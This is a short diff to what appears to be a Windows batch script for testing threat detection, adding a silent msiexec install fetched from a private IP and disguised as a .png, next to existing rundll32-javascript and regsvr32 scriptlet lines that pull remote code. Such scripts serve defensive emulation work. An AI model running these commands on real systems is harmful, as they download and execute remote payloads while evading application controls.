@@ -503,6 +503,8 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%
 ECHO ============================
 regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
 ECHO ============================
+msiexec /q /i http://192.168.100.3/tmp/cmd.png
+ECHO ============================
 ECHO ***************************************************
 ECHO Test already Finishied  ! Happy hunting threats :)
 ECHO ***************************************************
